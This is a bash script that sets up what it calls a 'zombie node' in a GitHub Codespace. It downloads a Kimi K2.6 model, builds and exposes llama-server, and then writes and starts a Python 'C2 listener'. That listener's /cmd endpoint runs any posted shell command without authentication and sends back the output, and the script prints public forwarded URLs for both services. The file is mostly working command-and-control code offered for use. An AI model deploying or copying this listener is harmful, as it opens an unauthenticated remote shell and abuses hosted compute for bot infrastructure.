#!/bin/bash
set -e
echo "[+] Booting Kimi 2.6 zombie node..."

# Install dependencies
sudo apt-get update -qq
sudo apt-get install -y -qq git-lfs curl wget build-essential python3-pip

# Install Hugging Face CLI
pip3 install --quiet huggingface-hub[cli] transformers accelerate

# Download the model (with token if set)
export HF_HUB_ENABLE_HF_TRANSFER=1
if [ -n "$HF_TOKEN" ]; then
    huggingface-cli download "$KIMI_MODEL" "Kimi-K2.6-${KIMI_QUANT}.gguf" \
        --local-dir ./model --local-dir-use-symlinks False --token "$HF_TOKEN"
else
    huggingface-cli download "$KIMI_MODEL" "Kimi-K2.6-${KIMI_QUANT}.gguf" \
        --local-dir ./model --local-dir-use-symlinks False
fi

# Build llama.cpp (if not already built)
if [ ! -f "./llama.cpp/build/bin/llama-server" ]; then
    git clone --depth 1 https://github.com/ggerganov/llama.cpp.git
    cd llama.cpp
    mkdir -p build && cd build
    cmake .. -DLLAMA_CUBLAS=OFF -DLLAMA_METAL=OFF -DCMAKE_BUILD_TYPE=Release
    make -j$(nproc) llama-server
    cd ../..
fi

# Start API server
nohup ./llama.cpp/build/bin/llama-server \
    --model "./model/Kimi-K2.6-${KIMI_QUANT}.gguf" \
    --host 0.0.0.0 --port "$API_PORT" \
    --ctx-size 8192 --n-gpu-layers 0 \
    > /tmp/kimi-api.log 2>&1 &

# Start C2 listener
cat > /tmp/c2_listener.py << 'EOF'
#!/usr/bin/env python3
import json, subprocess, sys
from http.server import HTTPServer, BaseHTTPRequestHandler
class C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/cmd':
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            try:
                cmd = json.loads(body).get('command', '')
                if cmd:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
                    response = {'status': 'ok', 'stdout': result.stdout, 'stderr': result.stderr}
                else:
                    response = {'status': 'error', 'message': 'no command'}
            except Exception as e:
                response = {'status': 'error', 'message': str(e)}
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())
    def do_GET(self):
        if self.path == '/health':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'alive', 'model': 'kimi-2.6'}).encode())
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 5000
server = HTTPServer(('0.0.0.0', PORT), C2Handler)
server.serve_forever()
EOF
nohup python3 /tmp/c2_listener.py "$C2_PORT" > /tmp/c2.log 2>&1 &

echo "✅ Node ready."
echo "API: https://${CODESPACE_NAME}-${API_PORT}.${GITHUB_CODESPACES_PORT_FORWARDING_DOMAIN}"
echo "C2 : https://${CODESPACE_NAME}-${C2_PORT}.${GITHUB_CODESPACES_PORT_FORWARDING_DOMAIN}"